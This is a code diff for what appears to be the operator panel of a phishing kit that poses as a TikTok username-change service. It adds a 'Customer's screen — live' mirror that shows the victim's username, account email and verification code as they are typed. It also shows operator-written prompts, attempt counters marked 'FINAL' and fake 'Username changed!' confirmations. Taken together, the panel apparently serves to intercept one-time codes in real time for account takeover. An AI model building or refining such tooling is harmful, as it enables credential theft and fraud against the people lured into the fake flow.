@@ -154,6 +154,68 @@
   }
   .rr input:focus { border-color:#25f4ee; }
 
+  /* ===== LIVE CUSTOMER SCREEN MIRROR ===== */
+  .mirror {
+    background:#161823; border-radius:10px; padding:14px 16px; margin-bottom:18px;
+    position:relative;
+  }
+  .mirror .mhead {
+    display:flex; align-items:center; justify-content:space-between; margin-bottom:11px;
+  }
+  .mirror .mhead .ttl {
+    font-size:11px; font-weight:700; color:#25f4ee; text-transform:uppercase; letter-spacing:.6px;
+    display:flex; align-items:center; gap:7px;
+  }
+  .mirror .mhead .ttl .dot { width:7px; height:7px; border-radius:50%; background:#25f4ee; animation:pl 1.6s infinite; }
+  .mirror .mhead .where { font-size:10px; color:#ffffff66; }
+  .mirror .mbody {
+    background:#fff; border-radius:8px; padding:14px 13px; font-size:12px; color:#161823;
+    min-height:120px; position:relative;
+  }
+  .mirror .mbody .mh {
+    text-align:center; font-size:13px; font-weight:800; letter-spacing:-0.3px; margin-bottom:4px;
+  }
+  .mirror .mbody .mh b { color:#fe2c55; }
+  .mirror .mbody .mbar { display:flex; gap:4px; margin:9px 0 12px; }
+  .mirror .mbody .mbar .b { flex:1; height:3px; border-radius:3px; background:#e8e8ea; }
+  .mirror .mbody .mbar .b.on { background:#fe2c55; }
+  .mirror .mbody .mbar .b.done { background:#25f4ee; }
+  .mirror .mbody .mst { font-size:11px; font-weight:700; margin-bottom:3px; }
+  .mirror .mbody .md { font-size:11px; color:#161823bf; line-height:1.4; margin-bottom:10px; }
+  .mirror .mbody .ml { font-size:10px; font-weight:600; color:#161823cc; margin-bottom:4px; }
+  .mirror .mbody .mf {
+    background:#fff; border:1px solid #e3e3e4; border-radius:5px; padding:7px 9px;
+    font-size:11px; color:#16182380; margin-bottom:9px; min-height:30px;
+  }
+  .mirror .mbody .mf.filled { color:#161823; }
+  .mirror .mbody .mf.claim { border-color:#fe2c55; background:#fff7f8; }
+  .mirror .mbody .mf.code { text-align:center; font-family:ui-monospace,Menlo,monospace; letter-spacing:4px; font-weight:700; font-size:14px; }
+  .mirror .mbody .mb {
+    background:#fe2c55; color:#fff; text-align:center; padding:8px; border-radius:5px;
+    font-size:11px; font-weight:700;
+  }
+  .mirror .mbody .mb.gh { background:#fff; color:#161823; border:1px solid #e3e3e4; margin-top:6px; }
+  .mirror .mbody .spin2 {
+    width:26px; height:26px; margin:6px auto 10px; border:3px solid #f1f1f2; border-top-color:#fe2c55;
+    border-radius:50%; animation:sp2 1s linear infinite;
+  }
+  @keyframes sp2 { to { transform: rotate(360deg);} }
+  .mirror .mbody .note { font-size:11px; color:#161823bf; text-align:center; line-height:1.5; }
+  .mirror .mbody .note b { color:#161823; }
+  .mirror .mbody .check2 {
+    width:32px; height:32px; margin:4px auto 10px; border-radius:50%; background:#25f4ee;
+    color:#161823; display:grid; place-items:center; font-size:17px; font-weight:900;
+  }
+  .mirror .mbody .newname2 { text-align:center; font-size:13px; font-weight:800; color:#fe2c55; margin-top:8px; }
+  .mirror .mbody .errm {
+    background:#fff1f3; border:1px solid #ffd9c2; border-radius:6px; padding:9px 10px;
+    font-size:11px; line-height:1.5; color:#161823;
+  }
+  .mirror .mbody .errm .et { font-size:10px; font-weight:800; color:#fe2c55; text-transform:uppercase; letter-spacing:.4px; margin-bottom:4px; }
+  .mirror .mbody .errm .ebtn { background:#fe2c55; color:#fff; text-align:center; padding:6px; border-radius:4px; font-size:10px; font-weight:700; margin-top:8px; }
+  .mirror .mbody .idle { text-align:center; color:#16182380; font-size:11px; padding:24px 0; }
+  .mirror .mlive { position:absolute; top:14px; right:16px; }
+
   ::-webkit-scrollbar { width:7px; height:7px; }
   ::-webkit-scrollbar-thumb { background:#e3e3e4; border-radius:4px; }
   ::-webkit-scrollbar-thumb:hover { background:#c8c8cc; }
@@ -292,6 +354,91 @@ const PRESETS = [
   { k:"Slow down", t:"Please wait a moment before trying again so the system can catch up." }
 ];
 
+// Render a live read-only mirror of the customer's current screen
+function buildMirror(t){
+  const cs = t.clientScreen; // number 1-5, "error", or undefined
+  const label = t.clientScreenLabel || "";
+  const ago = ft(t.clientScreenAt);
+
+  let inner = "";
+
+  const barHTML = (active) => {
+    // 3 segments matching customer stepper
+    let s = '<div class="mbar">';
+    for(let i=0;i<3;i++){
+      let cls = "";
+      if(i < active-1) cls = "done";
+      else if(i === active-1) cls = "on";
+      s += `<div class="b ${cls}"></div>`;
+    }
+    return s + '</div>';
+  };
+
+  if(cs === "error"){
+    const title = esc(t.clientErrorTitle) || "Something needs fixing";
+    const body = esc(t.clientErrorBody) || "";
+    inner = `<div class="mst" style="text-align:center;color:#fe2c55;">⚠️ Error modal on screen</div>
+      <div class="errm" style="margin-top:8px;">
+        <div class="et">${title}</div>
+        <div>${body}</div>
+        <div class="ebtn">Try again</div>
+      </div>`;
+  } else if(cs === 1 || cs === "1"){
+    inner = `<div class="mh">Change your TikTok username</div>
+      ${barHTML(1)}
+      <div class="mst">Step 1 — Your account</div>
+      <div class="ml">Current TikTok username</div>
+      <div class="mf ${t.clientUsername?'filled':''}">${t.clientUsername?('@'+esc(t.clientUsername)):'@your_current_username'}</div>
+      <div class="ml">Name you want to claim</div>
+      <div class="mf claim ${t.clientClaimName?'filled':''}">${t.clientClaimName?('@'+esc(t.clientClaimName)):'@the_new_username_you_want'}</div>
+      <div class="mb">Continue</div>`;
+  } else if(cs === 2 || cs === "2"){
+    inner = `<div class="mh">Change your TikTok username</div>
+      ${barHTML(2)}
+      <div class="mst">Step 2 — Verify it's you</div>
+      <div class="md">Current: @${esc(t.username||'—')} → Claiming: <b style="color:#fe2c55">@${esc(t.name||'—')}</b></div>
+      <div class="ml">Your TikTok account email</div>
+      <div class="mf ${t.clientEmail?'filled':''}">${esc(t.clientEmail)||(t.email?esc(t.email):'the email linked to your TikTok account')}</div>
+      <div class="mb">Submit claim request</div>
+      <div class="mb gh">Back</div>`;
+  } else if(cs === 3 || cs === "3"){
+    inner = `<div class="mh">Change your TikTok username</div>
+      ${barHTML(2)}
+      <div class="spin2"></div>
+      <div class="mst" style="text-align:center;">Processing your claim</div>
+      <div class="note">We're setting up your new username.<br><b>Keep this page open.</b></div>`;
+  } else if(cs === 4 || cs === "4"){
+    const a = t.attempt||1;
+    inner = `<div class="mh">Change your TikTok username</div>
+      ${barHTML(3)}
+      <div style="display:inline-block;padding:2px 7px;border-radius:3px;font-size:9px;font-weight:700;background:#fff1f3;color:#fe2c55;margin-bottom:6px;">Attempt ${a}${a>=3?' • FINAL':''}</div>
+      <div class="mst">Enter your verification code</div>
+      <div class="md">${esc(t.adminPrompt||'We sent a code to your email. Enter it below.')}</div>
+      <div class="ml">Verification code</div>
+      <div class="mf code ${t.clientCodeInput?'filled':''}">${esc(t.clientCodeInput)||'------'}</div>
+      <div class="mb">Confirm code</div>`;
+  } else if(cs === 5 || cs === "5"){
+    inner = `<div class="mh">Done!</div>
+      ${barHTML(3)}
+      <div class="check2">✓</div>
+      <div class="mst" style="text-align:center;">${esc(t.resolutionTitle||'Username changed!')}</div>
+      <div class="note">${esc(t.resolutionMessage||'Your TikTok username has been updated.')}</div>
+      <div class="newname2">You're now @${esc(t.name||'')}</div>`;
+  } else {
+    inner = `<div class="idle">No screen data yet.<br>Waiting for customer to load…</div>`;
+  }
+
+  const whereText = cs==="error" ? "ERROR MODAL" : (label || (cs!=null?("Screen "+cs):"waiting…"));
+
+  return `<div class="mirror">
+    <div class="mhead">
+      <div class="ttl"><span class="dot"></span>Customer's screen — live</div>
+      <div class="where">${esc(whereText)} • ${ago}</div>
+    </div>
+    <div class="mbody">${inner}</div>
+  </div>`;
+}
+
 function renderDetail(){
   const t=tickets.find(x=>x.id===selId);
   if(!t){ $("de").style.display="grid"; $("det").style.display="none"; return; }
@@ -307,6 +454,8 @@ function renderDetail(){
         + `<div class="s">from @${esc(t.username||"")} • ${t.ticketId||t.id} • <span class="pill p-${t.status}">${sLabel}</span></div>`
       + `</div>`
     + `</div>`
+
+    + buildMirror(t)
 
     + `<div class="grid">`
       + `<div class="ic"><div class="k">Current username</div><div class="v">@${esc(t.username||"—")}</div></div>`
